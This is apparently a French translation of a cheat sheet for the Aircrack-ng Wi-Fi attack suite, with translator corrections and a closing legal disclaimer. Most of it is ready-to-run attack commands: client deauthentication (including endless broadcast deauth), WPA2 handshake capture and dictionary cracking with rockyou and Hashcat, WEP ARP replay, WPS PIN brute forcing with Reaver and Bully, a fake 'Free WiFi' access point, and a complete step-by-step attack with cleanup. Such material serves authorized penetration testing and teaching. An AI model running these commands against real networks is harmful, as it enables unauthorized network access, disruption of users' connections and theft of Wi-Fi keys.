# 📶 Aircrack-ng — aide-mémoire de la suite de test de sécurité Wi-Fi

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
   █████╗ ██╗██████╗  ██████╗██████╗  █████╗  ██████╗██╗  ██╗
  ██╔══██╗██║██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
  ███████║██║██████╔╝██║     ██████╔╝███████║██║     █████╔╝ 
  ██╔══██║██║██╔══██╗██║     ██╔══██╗██╔══██║██║     ██╔═██╗ 
  ██║  ██║██║██║  ██║╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗
  ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
                    Suite de test de sécurité Wi-Fi
```

<p align="center">
  <img src="https://img.shields.io/badge/Aircrack--ng-WiFi_Hacking-blue?style=for-the-badge" alt="Aircrack-ng">
  <img src="https://img.shields.io/badge/WPA2-Cracking-red?style=for-the-badge" alt="WPA2">
  <img src="https://img.shields.io/badge/Wireless-Security-green?style=for-the-badge" alt="Sécurité sans fil">
</p>

---

## 📋 Table des matières

- [Qu’est-ce qu’Aircrack-ng ?](#-quest-ce-quaircrack-ng-)
- [Installation](#-installation)
- [Mode moniteur](#-mode-moniteur)
- [Reconnaissance (airodump-ng)](#-reconnaissance-airodump-ng)
- [Désauthentification (aireplay-ng)](#-désauthentification-aireplay-ng)
- [Recherche de clés WPA/WPA2](#-recherche-de-clés-wpawpa2)
- [Recherche de clés WEP](#-recherche-de-clés-wep)
- [Attaques WPS](#-attaques-wps)
- [Outils supplémentaires](#-outils-supplémentaires)
- [Déroulement complet d’une attaque](#-déroulement-complet-dune-attaque)
- [Référence rapide](#-référence-rapide)
- [Avertissement juridique](#-avertissement-juridique)
- [Ressources](#-ressources)

---

## 🎯 Qu’est-ce qu’Aircrack-ng ?

**Aircrack-ng** est une suite complète d’évaluation de la sécurité des réseaux Wi-Fi. Elle comprend :

- 📡 **airodump-ng** — Capture de paquets et détection de réseaux
- 💥 **aireplay-ng** — Injection de paquets et désauthentification
- 🔓 **aircrack-ng** — Recherche de clés WEP et WPA/WPA2
- 🔧 **airmon-ng** — Activation et désactivation du mode moniteur
- 📝 **airodecap-ng** — Déchiffrement du trafic capturé

### Prérequis

| Prérequis | Description |
| ------------- | ------------- |
| **Adaptateur sans fil** | Doit prendre en charge le mode moniteur et l’injection de paquets |
| **Chipsets pris en charge** | Atheros, Ralink, certains Realtek |
| **Système d’exploitation** | Linux recommandé (Kali) |

### Adaptateurs compatibles courants

> **Précision :** la compatibilité dépend du chipset réel (circuit radio), de la révision matérielle et du pilote, pas seulement du nom commercial ; le tableau n’est pas une garantie d’achat ou de prise en charge ([documentation officielle](https://www.aircrack-ng.org/doku.php?id=compatibility_drivers)).

| Adaptateur | Chipset | Remarques |
| --------- | --------- | ------- |
| Alfa AWUS036ACH | RTL8812AU | Double bande, puissant |
| Alfa AWUS036NHA | Atheros AR9271 | Classique, fiable |
| TP-Link TL-WN722N v1 | Atheros AR9271 | Option économique |

---

## 🚀 Installation

### Kali Linux (préinstallé)

```bash
# Déjà installé : vérifier la version
aircrack-ng --version

# Mettre à jour
sudo apt update && sudo apt install aircrack-ng
```

### Debian/Ubuntu

```bash
sudo apt update
sudo apt install aircrack-ng
```

### Depuis les sources

```bash
git clone https://github.com/aircrack-ng/aircrack-ng.git
cd aircrack-ng
autoreconf -i
./configure
make
sudo make install
```

---

## 📡 Mode moniteur

### Identifier l’interface sans fil

```bash
# Lister les interfaces sans fil
iwconfig

# Ou
iw dev

# Ou
airmon-ng
```

### Activer le mode moniteur

> **Précision :** `wlan0` et `wlan0mon` sont des noms d’exemple ; la création et le nom de l’interface dépendent du pilote. `check kill` arrête des processus réseau et peut couper la connexion normale ([airmon-ng](https://www.aircrack-ng.org/doku.php?id=airmon-ng)).

```bash
# Méthode 1 : airmon-ng (recommandé)
sudo airmon-ng start wlan0

# Sortie : Monitor mode enabled on wlan0mon

# Méthode 2 : manuelle
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up
```

### Arrêter les processus qui interfèrent

```bash
# Arrêter les processus susceptibles d’interférer
sudo airmon-ng check kill

# Ou manuellement
sudo systemctl stop NetworkManager
sudo killall wpa_supplicant
```

### Désactiver le mode moniteur

```bash
# Arrêter le mode moniteur
sudo airmon-ng stop wlan0mon

# Redémarrer NetworkManager
sudo systemctl start NetworkManager
```

### Changer de canal

```bash
# Choisir un canal précis
sudo iwconfig wlan0mon channel 6

# Ou avec airmon-ng
sudo airmon-ng start wlan0 6
```

---

## 🔍 Reconnaissance (airodump-ng)

### Analyse de base

```bash
# Repérer tous les réseaux
sudo airodump-ng wlan0mon

# Sortie :
# BSSID              PWR  CH  ENC   AUTH  ESSID
# AA:BB:CC:DD:EE:FF  -45   6  WPA2  PSK   TargetNetwork
```

### Analyser une bande précise

```bash
# Bande 2.4GHz uniquement
sudo airodump-ng --band g wlan0mon

# Bande 5GHz uniquement
sudo airodump-ng --band a wlan0mon

# Les deux bandes
sudo airodump-ng --band abg wlan0mon
```

### Cibler un réseau précis

```bash
# Filtrer par canal et BSSID
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon

# Écrire la capture dans un fichier
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Crée : capture-01.cap, capture-01.csv, etc.
```

### Comprendre la sortie

```
BSSID              PWR  Beacons  #Data  CH  MB  ENC   CIPHER  AUTH  ESSID
AA:BB:CC:DD:EE:FF  -45  150      45     6   54  WPA2  CCMP    PSK   HomeNetwork

BSSID              STATION            PWR   Rate  Lost  Frames  Notes
AA:BB:CC:DD:EE:FF  11:22:33:44:55:66  -50   54e-54e  0    125    
```

| Champ | Description |
| ------- | ------------- |
| BSSID | Adresse MAC du point d’accès (AP) |
| PWR | Puissance du signal (plus proche de 0 = plus fort) |
| Beacons | Nombre de trames de balise (beacons) |
| #Data | Nombre de paquets de données |
| CH | Canal |
| ENC | Chiffrement (WPA2/WPA/WEP/OPN) |
| CIPHER | CCMP (AES) / TKIP |
| AUTH | PSK / MGT |
| ESSID | Nom du réseau |
| STATION | Adresse MAC du client connecté |

### Options de filtrage

```bash
# Afficher uniquement les réseaux chiffrés
sudo airodump-ng --encrypt wpa2 wlan0mon

# Afficher uniquement WEP
sudo airodump-ng --encrypt wep wlan0mon

# ESSID précis
sudo airodump-ng --essid "TargetNetwork" wlan0mon
```

---

## 💥 Désauthentification (aireplay-ng)

### Pourquoi désauthentifier ?

> **Précision :** cette présentation vise surtout WPA/WPA2-PSK. Un handshake capturé ne révèle pas directement le mot de passe : le dictionnaire doit contenir un candidat valable. La désauthentification ne garantit pas une reconnexion exploitable et n’est pas universelle, notamment avec la protection des trames de gestion (PMF) ; ces exemples ne constituent pas une méthode générale pour WPA3 ou les réseaux Enterprise. Le compteur de désauthentification représente des groupes de trames, pas nécessairement un seul paquet par unité ([Aircrack-ng](https://www.aircrack-ng.org/doku.php?id=aircrack-ng), [désauthentification](https://www.aircrack-ng.org/doku.php?id=deauthentication), [PMF — HPE Aruba](https://arubanetworking.hpe.com/techdocs/aos/wifi-design-deploy/security/features/pmf/)).

La désauthentification (*deauth*) pousse les clients à se reconnecter, ce qui permet de capturer l’échange d’authentification en quatre étapes (*4-way handshake*) utilisé pour rechercher une clé WPA/WPA2.

### Désauthentifier un client

```bash
# Désauthentifier un client précis
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# -0 : Attaque de désauthentification
# 5  : Nombre de désauthentifications (0 = infini)
# -a : BSSID du point d’accès
# -c : Adresse MAC du client
```

### Désauthentifier tous les clients

```bash
# Désauthentification en diffusion (tous les clients)
sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Plus agressif
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon
```

### Vérifier la présence d’un handshake

```
# Dans airodump-ng, rechercher :
WPA handshake: AA:BB:CC:DD:EE:FF

# Cette indication apparaît en haut à droite
```

---

## 🔓 Recherche de clés WPA/WPA2

### Déroulement complet d’une attaque WPA2

```bash
# Étape 1 : activer le mode moniteur
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Étape 2 : repérer les réseaux
sudo airodump-ng wlan0mon

# Étape 3 : cibler un réseau précis (capture)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Étape 4 : désauthentifier un client (nouveau terminal)
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Étape 5 : attendre le handshake (affiché dans airodump-ng)
# "WPA handshake: AA:BB:CC:DD:EE:FF"

# Étape 6 : tester un dictionnaire
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

### Attaque par dictionnaire

```bash
# Attaque par dictionnaire de base
aircrack-ng -w wordlist.txt capture-01.cap

# Utiliser rockyou
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Plusieurs dictionnaires
aircrack-ng -w wordlist1.txt,wordlist2.txt capture-01.cap
```

### Préciser l’ESSID cible

```bash
# Si la capture contient plusieurs réseaux
aircrack-ng -w wordlist.txt -e "TargetNetwork" capture-01.cap

# Ou par BSSID
aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
```

### Utiliser Hashcat (accélération GPU)

> **Correction des formats :** l’original mélange les formats : `-j` exporte du HCCAPX, tandis que `-J` correspond à l’ancien HCCAP. Le mode Hashcat `22000` attend un format texte PMKID/EAPOL, pas directement un fichier `.hccapx`. Les commandes, noms de fichiers et commentaires historiques sont conservés ; la même réserve vaut pour le déroulement final ([options Aircrack-ng](https://www.aircrack-ng.org/doku.php?id=aircrack-ng), [formats Hashcat](https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2)).

```bash
# Convertir le fichier cap au format hashcat
aircrack-ng capture-01.cap -J hashcat_file
# Crée : hashcat_file.hccapx

# Ou utiliser cap2hccapx
cap2hccapx capture-01.cap hashcat_file.hccapx

# Rechercher la clé avec Hashcat
hashcat -m 22000 hashcat_file.hccapx wordlist.txt

# hashcat -m 2500 pour l’ancien format hccap
```

### Convertir les formats

```bash
# CAP vers HCCAPX (Hashcat)
aircrack-ng capture-01.cap -j hashcat_output

# CAP vers PCAP
editcap capture-01.cap output.pcap

# Fusionner plusieurs captures cap
mergecap -w merged.cap capture-01.cap capture-02.cap
```

---

## 🔐 Recherche de clés WEP

> ⚠️ WEP est obsolète et non sécurisé. La plupart des réseaux utilisent désormais WPA2/WPA3.

### Types d’attaques WEP

| Attaque | Description |
| -------- | ------------- |
| ARP Replay (rejeu ARP) | Capturer et rejouer des paquets ARP |
| Fake Auth (fausse authentification) | S’associer au point d’accès sans clé |
| Fragmentation | Produire un flux de clés |
| ChopChop | Déchiffrer des paquets sans clé |

### Attaque WEP de base

> **Précision :** `>50,000` IV (vecteurs d’initialisation) est un repère du texte original, pas un seuil garantissant la récupération. Le résultat dépend de la méthode, des paquets exploitables et de la longueur de clé ([documentation officielle](https://www.aircrack-ng.org/doku.php?id=aircrack-ng)).

```bash
# Étape 1 : capturer le trafic
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon

# Étape 2 : fausse authentification
sudo aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h <your_mac> wlan0mon

# Étape 3 : attaque par rejeu ARP
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h <your_mac> wlan0mon

# Étape 4 : rechercher la clé une fois assez d’IV collectés (>50,000)
sudo aircrack-ng wep_capture-01.cap
```

### Modes d’attaque d’aireplay-ng

| Mode | Description |
| ------ | ------------- |
| `-0` | Désauthentification |
| `-1` | Fausse authentification |
| `-2` | Rejeu interactif de paquets |
| `-3` | Rejeu de requêtes ARP |
| `-4` | Attaque KoreK chopchop |
| `-5` | Attaque par fragmentation |
| `-9` | Test d’injection |

---

## 🔓 Attaques WPS

### Utiliser Reaver

> **Précision :** WPS activé ne signifie pas que Pixie-Dust fonctionnera. Cette technique dépend de faiblesses de génération des valeurs cryptographiques sur certains équipements ; les protections et verrouillages peuvent limiter les attaques PIN ([projet Reaver](https://github.com/t6x/reaver-wps-fork-t6x)).

```bash
# Installer Reaver
sudo apt install reaver

# Attaque WPS de base
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# Avec le canal
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv

# Attaque Pixie-Dust (plus rapide)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv
```

### Utiliser Bully

```bash
# Installer Bully
sudo apt install bully

# Attaque de base
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -v 3

# Pixie-Dust
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -d -v 3
```

### Wash (repérer les points d’accès avec WPS)

```bash
# Repérer les réseaux WPS
sudo wash -i wlan0mon

# La sortie affiche :
# BSSID              Ch  dBm  WPS  Lck  Vendor  ESSID
# AA:BB:CC:DD:EE:FF   6  -45  2.0  No   Realtek HomeNetwork
```

---

## 🔧 Outils supplémentaires

### airbase-ng (faux point d’accès)

```bash
# Créer un faux point d’accès
sudo airbase-ng -e "Free WiFi" -c 6 wlan0mon

# Avec un BSSID précis
sudo airbase-ng -e "Free WiFi" -a AA:BB:CC:DD:EE:FF -c 6 wlan0mon
```

### airdecap-ng (déchiffrer les captures)

> **Coquille de l’original :** le nom `airodecap-ng` de l’introduction désigne ici `airdecap-ng`, l’exécutable utilisé ci-dessous. Une clé connue ne suffit pas toujours : les données d’authentification nécessaires doivent aussi se trouver dans la capture WPA/WPA2 ([documentation officielle](https://www.aircrack-ng.org/doku.php?id=airdecap-ng)).

```bash
# Déchiffrer une capture WPA avec une clé connue
airdecap-ng -e "NetworkName" -p "password123" capture-01.cap

# Déchiffrer une capture WEP
airdecap-ng -w <wep_key> capture-01.cap
```

### Options d’aircrack-ng

```bash
# Afficher toutes les options
aircrack-ng --help

# Utiliser plusieurs cœurs du processeur
aircrack-ng -p 4 -w wordlist.txt capture-01.cap

# Mode silencieux
aircrack-ng -q -w wordlist.txt capture-01.cap

# Préciser l’ESSID
aircrack-ng -e "NetworkName" -w wordlist.txt capture-01.cap
```

### packetforge-ng (créer des paquets)

```bash
# Créer un paquet ARP
packetforge-ng -0 -a AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 -k 255.255.255.255 -l 255.255.255.255 -y fragment.xor -w arp_packet
```

---

## 🎯 Déroulement complet d’une attaque

### Attaque WPA2 étape par étape

```bash
# Terminal 1 : préparation
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Vérifier le mode moniteur
iwconfig  # Devrait afficher wlan0mon

# Terminal 1 : repérer les réseaux
sudo airodump-ng wlan0mon
# Noter le BSSID, CH et ESSID de la cible

# Terminal 1 : ciblage et capture
sudo airodump-ng -c <CHANNEL> --bssid <TARGET_BSSID> -w handshake wlan0mon

# Terminal 2 : attaque par désauthentification
sudo aireplay-ng -0 5 -a <TARGET_BSSID> -c <CLIENT_MAC> wlan0mon

# Attendre "WPA handshake: XX:XX:XX:XX:XX:XX" dans le terminal 1
# Appuyer sur Ctrl+C pour arrêter la capture

# Terminal 1 : rechercher la clé à partir du handshake
aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap

# Ou avec Hashcat (GPU, plus rapide)
aircrack-ng handshake-01.cap -j hashcat_file
hashcat -m 22000 hashcat_file.hccapx /usr/share/wordlists/rockyou.txt
```

### Nettoyage après l’attaque

```bash
# Arrêter le mode moniteur
sudo airmon-ng stop wlan0mon

# Redémarrer NetworkManager
sudo systemctl start NetworkManager

# Nettoyer les fichiers (facultatif)
rm -f handshake-*.cap handshake-*.csv handshake-*.kismet.csv
```

---

## 📊 Référence rapide

### Commandes essentielles

| Objectif | Commande |
| --------- | --------- |
| Activer le mode moniteur | `airmon-ng start wlan0` |
| Désactiver le mode moniteur | `airmon-ng stop wlan0mon` |
| Arrêter les processus gênants | `airmon-ng check kill` |
| Repérer les réseaux | `airodump-ng wlan0mon` |
| Cibler un réseau | `airodump-ng -c CH --bssid BSSID -w file wlan0mon` |
| Désauthentifier | `aireplay-ng -0 5 -a BSSID -c CLIENT wlan0mon` |
| Rechercher une clé WPA | `aircrack-ng -w wordlist.txt capture.cap` |

### Résumé des attaques

| Attaque | Chiffrement | Méthode |
| -------- | ------------ | -------- |
| Dictionnaire | WPA/WPA2 | Capturer le handshake → Tester un dictionnaire |
| Reaver | WPS | Recherche exhaustive du PIN WPS |
| Pixie-Dust | WPS | Attaque WPS hors ligne |
| ARP Replay (rejeu ARP) | WEP | Collecter les vecteurs d’initialisation (IV) → Rechercher la clé |

### Dictionnaires utiles

| Chemin | Description |
| ------ | ------------- |
| `/usr/share/wordlists/rockyou.txt` | Courant sous Kali |
| `/usr/share/wordlists/fasttrack.txt` | Vérification rapide |
| `/usr/share/seclists/Passwords/` | Collection SecLists |

### Dépannage

```bash
# L’interface ne passe pas en mode moniteur
sudo rfkill unblock wifi
sudo rfkill unblock all

# Vérifier si le pilote prend en charge l’injection
sudo aireplay-ng -9 wlan0mon

# Aucun handshake capturé
# - Se rapprocher de la cible
# - Essayer différents clients
# - Désauthentifier plus intensément
# - Attendre plus longtemps

# Airmon affiche "Found X processes"
sudo airmon-ng check kill
```

---

<a id="-avertissement-juridique"></a>
## ⚠️ Avertissement juridique

```
⚠️ ATTENTION : utiliser ces outils uniquement sur les réseaux dont vous êtes
PROPRIÉTAIRE ou pour lesquels vous disposez d’une AUTORISATION ÉCRITE EXPLICITE.
L’accès sans autorisation à des réseaux informatiques est ILLÉGAL dans la plupart
des juridictions.

Utilisations responsables :
✅ Audit de sécurité
✅ Test d’intrusion (avec autorisation)
✅ Apprentissage en laboratoire

Ne jamais utiliser pour :
❌ Accéder à un réseau sans autorisation
❌ Voler des identifiants
❌ Poursuivre un objectif malveillant
```

---

## 📚 Ressources

- [Site officiel d’Aircrack-ng](https://www.aircrack-ng.org/)
- [Wiki Aircrack-ng](https://www.aircrack-ng.org/doku.php)
- [Wi-Fi avec Hashcat](https://hashcat.net/wiki/)

### Aide-mémoire associés
- [Hashcat](../../Hashcat/translations/README.fr.md)
- [Wireshark](../../Wireshark/translations/README.fr.md)
- [Commandes Linux](../../Linux-Commands/translations/README.fr.md)

---

<p align="center">
  <b>📶 Maîtrisez les tests de sécurité Wi-Fi !</b><br>
  <i>Aircrack-ng — l’allié du pentesteur Wi-Fi</i>
</p>
